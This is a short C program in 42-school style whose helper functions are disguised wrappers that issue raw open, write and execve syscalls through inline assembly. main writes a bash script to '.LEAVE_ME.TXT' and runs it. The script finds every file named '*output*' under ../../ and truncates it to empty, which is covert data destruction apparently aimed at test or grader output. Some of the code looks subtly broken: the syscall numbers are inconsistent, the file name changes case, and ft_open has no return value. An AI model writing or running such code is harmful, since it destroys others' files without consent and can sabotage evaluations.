#include <stdio.h>
#include <fcntl.h>

int			ft_strlen(char *str)
{
	int	i;
	
	i = 0;
	while (str[i])
		i++;
	return (i);
}

int			ft_open(char *filename, int flag, int mode)
{
	(void)filename;
	(void)flag;
	(void)mode;
	asm(".Intel_syntax; mov rax, 0x2000005; SYSCALL;");
}

void		 ft_write(int fd, char *buf, int size)
{
	(void)fd;
	(void)buf;
	(void)size;
	asm(".Intel_syntax; mov rax, 0x2000004; SYSCALL;");
}

void		ft_execve(char *fd, char **buf, char **size)
{
	(void)fd;
	(void)buf;
	(void)size;
	asm(".Intel_syntax; mov rax, 0x000003B; SYSCALL;");
}

int			main(void)
{
	char	*str;
	int		len;

	char *tab[] = {NULL};
	str = "#!/bin/bash\n\
				for file in $(find ../../ -name \"*output*\"); \
				do\necho -n \"\" > $file\ndone\n";
	len = ft_strlen(str);
	int fd = ft_open(".LEAVE_ME.TXT", 0x601, 448);
	ft_write(fd, str, len);
	ft_execve(".LEAVE_ME.txt", tab, tab);
	return (0);
}
